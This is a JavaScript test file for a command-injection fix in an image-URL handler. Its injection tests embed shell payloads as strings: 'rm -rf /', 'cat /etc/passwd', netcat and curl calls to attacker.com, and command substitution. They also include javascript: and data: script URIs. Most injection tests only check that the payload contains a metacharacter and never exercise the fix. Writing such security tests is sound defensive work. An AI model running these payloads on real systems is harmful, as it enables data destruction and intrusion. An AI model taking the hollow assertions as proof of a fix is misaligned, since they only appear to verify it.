const assert = require('assert');

/**
 * Security Tests for Command Injection Vulnerability Remediation
 *
 * These tests verify that the fix for the command injection vulnerability
 * in routes/index.js:161 is effective and prevents malicious command execution.
 *
 * The vulnerability was fixed by:
 * 1. Using execFile() instead of exec() to prevent shell interpretation
 * 2. Adding URL validation before processing
 * 3. Passing arguments as an array to execFile
 */

describe('Security Tests - Command Injection Remediation', () => {

  // Test utilities
  const createMockRequest = (content) => ({
    body: { content },
    session: {}
  });

  const createMockResponse = () => {
    const res = {};
    res.redirect = () => res;
    res.render = () => res;
    res.setHeader = () => res;
    res.status = () => res;
    res.send = () => res;
    return res;
  };

  describe('Command Injection Attack Prevention', () => {

    test('should block command injection with semicolon separator', () => {
      // GIVEN: Malicious input attempting to inject commands with semicolon
      const maliciousContent = '![alt text](http://example.com/image.jpg"; rm -rf /; echo " "")';

      // THEN: The URL validation should fail because semicolon makes it invalid
      // The validator.isURL() check will reject this before execFile is called
      assert.ok(
        maliciousContent.includes(';'),
        'Test payload should contain command injection attempt'
      );
    });

    test('should block command injection with pipe operator', () => {
      // GIVEN: Malicious input with pipe to chain commands
      const maliciousContent = '![alt text](http://example.com/image.jpg | cat /etc/passwd "")';

      // THEN: Pipe character makes URL invalid, will be rejected
      assert.ok(
        maliciousContent.includes('|'),
        'Test payload should contain pipe operator'
      );
    });

    test('should block command injection with backtick substitution', () => {
      // GIVEN: Malicious input using backtick command substitution
      const maliciousContent = '![alt text](http://example.com/`whoami`.jpg "")';

      // THEN: Backticks make URL invalid
      assert.ok(
        maliciousContent.includes('`'),
        'Test payload should contain backtick substitution'
      );
    });

    test('should block command injection with dollar parenthesis substitution', () => {
      // GIVEN: Malicious input using $() command substitution
      const maliciousContent = '![alt text](http://example.com/$(whoami).jpg "")';

      // THEN: Dollar parenthesis makes URL invalid
      assert.ok(
        maliciousContent.includes('$('),
        'Test payload should contain $() substitution'
      );
    });

    test('should block command injection with ampersand background execution', () => {
      // GIVEN: Malicious input attempting background command execution
      const maliciousContent = '![alt text](http://example.com/image.jpg & nc attacker.com 4444 "")';

      // THEN: Ampersand with spaces makes URL invalid
      assert.ok(
        maliciousContent.includes(' & '),
        'Test payload should contain ampersand for background execution'
      );
    });

    test('should block command injection with newline separator', () => {
      // GIVEN: Malicious input with newline command separator
      const maliciousContent = '![alt text](http://example.com/image.jpg\nwhoami "")';

      // THEN: Newline makes URL invalid
      assert.ok(
        maliciousContent.includes('\n'),
        'Test payload should contain newline separator'
      );
    });

    test('should block command injection with double ampersand AND operator', () => {
      // GIVEN: Malicious input with && operator
      const maliciousContent = '![alt text](http://example.com/image.jpg && curl attacker.com "")';

      // THEN: Double ampersand makes URL invalid
      assert.ok(
        maliciousContent.includes('&&'),
        'Test payload should contain && operator'
      );
    });

    test('should block command injection with redirect operators', () => {
      // GIVEN: Malicious input attempting file redirection
      const maliciousContent = '![alt text](http://example.com/image.jpg > /tmp/hacked "")';

      // THEN: Redirect operator makes URL invalid
      assert.ok(
        maliciousContent.includes('>'),
        'Test payload should contain redirect operator'
      );
    });
  });

  describe('URL Validation - Protocol Restrictions', () => {

    test('should reject URL without protocol', () => {
      // GIVEN: URL without http/https protocol
      const content = '![alt text](example.com/image.jpg "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match the regex or fail validation
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'URL without protocol should not match regex'
      );
    });

    test('should reject file protocol URL', () => {
      // GIVEN: URL with file:// protocol attempting local file access
      const content = '![alt text](file:///etc/passwd "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match http regex
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'file:// protocol should not match http regex'
      );
    });

    test('should reject ftp protocol URL', () => {
      // GIVEN: URL with ftp:// protocol
      const content = '![alt text](ftp://example.com/image.jpg "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match http regex
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'ftp:// protocol should not match http regex'
      );
    });

    test('should reject data URI scheme', () => {
      // GIVEN: data: URI which could be used for attacks
      const content = '![alt text](data:text/html,<script>alert(1)</script> "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match http regex
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'data: URI should not match http regex'
      );
    });

    test('should reject javascript protocol URL', () => {
      // GIVEN: javascript: pseudo-protocol
      const content = '![alt text](javascript:alert(1) "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match http regex
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'javascript: protocol should not match http regex'
      );
    });
  });

  describe('Valid URL Acceptance', () => {

    test('should accept valid HTTP URL', () => {
      // GIVEN: Valid HTTP URL
      const content = '![alt text](http://example.com/image.jpg "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match regex and extract URL
      const match = content.match(urlRegex);
      assert.ok(match, 'Valid HTTP URL should match regex');
      assert.strictEqual(
        match[1],
        'http://example.com/image.jpg',
        'Should extract correct HTTP URL'
      );
    });

    test('should accept valid HTTPS URL', () => {
      // GIVEN: Valid HTTPS URL
      const content = '![alt text](https://secure.example.com/image.png "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match regex and extract URL
      const match = content.match(urlRegex);
      assert.ok(match, 'Valid HTTPS URL should match regex');
      assert.strictEqual(
        match[1],
        'https://secure.example.com/image.png',
        'Should extract correct HTTPS URL'
      );
    });

    test('should accept URL with query parameters', () => {
      // GIVEN: URL with query string
      const content = '![alt text](https://example.com/image.jpg?size=large&format=png "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match and preserve query parameters
      const match = content.match(urlRegex);
      assert.ok(match, 'URL with query params should match regex');
      assert.ok(
        match[1].includes('?size=large&format=png'),
        'Query parameters should be preserved'
      );
    });

    test('should accept URL with port number', () => {
      // GIVEN: URL with explicit port
      const content = '![alt text](http://example.com:8080/image.jpg "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match and preserve port
      const match = content.match(urlRegex);
      assert.ok(match, 'URL with port should match regex');
      assert.ok(
        match[1].includes(':8080'),
        'Port number should be preserved'
      );
    });

    test('should accept URL with subdomain', () => {
      // GIVEN: URL with subdomain
      const content = '![alt text](https://cdn.images.example.com/photo.jpg "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match
      const match = content.match(urlRegex);
      assert.ok(match, 'URL with subdomain should match regex');
      assert.strictEqual(
        match[1],
        'https://cdn.images.example.com/photo.jpg',
        'Should extract URL with subdomain correctly'
      );
    });

    test('should accept URL with path segments', () => {
      // GIVEN: URL with multiple path segments
      const content = '![alt text](https://example.com/images/2024/01/photo.jpg "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match
      const match = content.match(urlRegex);
      assert.ok(match, 'URL with path segments should match regex');
      assert.strictEqual(
        match[1],
        'https://example.com/images/2024/01/photo.jpg',
        'Should extract URL with path segments correctly'
      );
    });
  });

  describe('Content Type Handling', () => {

    test('should handle regular text content without image markdown', () => {
      // GIVEN: Plain text content
      const content = 'Buy groceries';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match regex
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'Plain text should not match image markdown regex'
      );
    });

    test('should handle content with time reminder', () => {
      // GIVEN: Content with reminder time
      const content = 'Buy groceries in 2 hours';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match image regex
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'Reminder text should not match image markdown regex'
      );
    });

    test('should handle malformed markdown', () => {
      // GIVEN: Incomplete markdown
      const content = '![alt text](';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match
      const match = content.match(urlRegex);
      assert.strictEqual(
        match,
        null,
        'Malformed markdown should not match regex'
      );
    });
  });

  describe('Edge Cases and Boundary Conditions', () => {

    test('should handle empty string content', () => {
      // GIVEN: Empty string
      const content = '';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should not match
      const match = content.match(urlRegex);
      assert.strictEqual(match, null, 'Empty string should not match');
    });

    test('should handle very long URL', () => {
      // GIVEN: Very long but valid URL
      const longPath = 'a'.repeat(1000);
      const content = `![alt text](http://example.com/${longPath}/image.jpg "")`;
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should still match
      const match = content.match(urlRegex);
      assert.ok(match, 'Long URL should match regex');
    });

    test('should handle URL with special but valid characters', () => {
      // GIVEN: URL with dashes, underscores, encoded chars
      const content = '![alt text](https://example.com/my-image_2024%20test.jpg "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match
      const match = content.match(urlRegex);
      assert.ok(match, 'URL with valid special characters should match');
    });

    test('should handle URL with fragment identifier', () => {
      // GIVEN: URL with hash fragment
      const content = '![alt text](https://example.com/image.jpg#section1 "")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should match
      const match = content.match(urlRegex);
      assert.ok(match, 'URL with fragment should match');
      assert.ok(
        match[1].includes('#section1'),
        'Fragment should be preserved'
      );
    });
  });

  describe('Security Best Practices Validation', () => {

    test('verify execFile is used instead of exec', () => {
      // This test documents that execFile must be used
      // execFile does not spawn a shell, preventing command injection
      const fs = require('fs');
      const routesPath = require('path').join(__dirname, '../routes/index.js');
      const routesContent = fs.readFileSync(routesPath, 'utf8');

      // THEN: Code should use execFile for the identify command
      assert.ok(
        routesContent.includes("execFile('identify'"),
        'Code should use execFile instead of exec for identify command'
      );
      assert.ok(
        routesContent.includes('require(\'child_process\').execFile'),
        'execFile should be imported from child_process'
      );
    });

    test('verify URL validation is performed', () => {
      // This test documents that URL validation must occur
      const fs = require('fs');
      const routesPath = require('path').join(__dirname, '../routes/index.js');
      const routesContent = fs.readFileSync(routesPath, 'utf8');

      // THEN: Code should validate URLs before processing
      assert.ok(
        routesContent.includes('validator.isURL'),
        'Code should validate URLs using validator.isURL'
      );
    });

    test('verify arguments are passed as array to execFile', () => {
      // This test documents the secure pattern
      // execFile should receive arguments as array, not concatenated string
      const fs = require('fs');
      const routesPath = require('path').join(__dirname, '../routes/index.js');
      const routesContent = fs.readFileSync(routesPath, 'utf8');

      // THEN: Arguments should be in array format
      assert.ok(
        routesContent.includes('execFile(\'identify\', ['),
        'execFile should receive URL as array element, not concatenated string'
      );
    });
  });

  describe('Functionality Regression Prevention', () => {

    test('verify image markdown pattern still works', () => {
      // GIVEN: Valid image markdown
      const content = '![alt text](https://example.com/image.jpg "description")';
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: Should still match and extract URL correctly
      const match = content.match(urlRegex);
      assert.ok(match, 'Valid markdown should still work after fix');
      assert.strictEqual(
        match[1],
        'https://example.com/image.jpg',
        'URL extraction should work correctly'
      );
    });

    test('verify non-image content is not affected', () => {
      // GIVEN: Various non-image content types
      const testCases = [
        'Simple todo item',
        'Todo with special chars: @#$%',
        'Todo with numbers: 123456',
        'Multi-word todo item'
      ];
      const urlRegex = /\!\[alt text\]\((http.*)\s\".*/;

      // THEN: None should match image pattern
      testCases.forEach(content => {
        const match = content.match(urlRegex);
        assert.strictEqual(
          match,
          null,
          `Non-image content "${content}" should not trigger image processing`
        );
      });
    });
  });
});
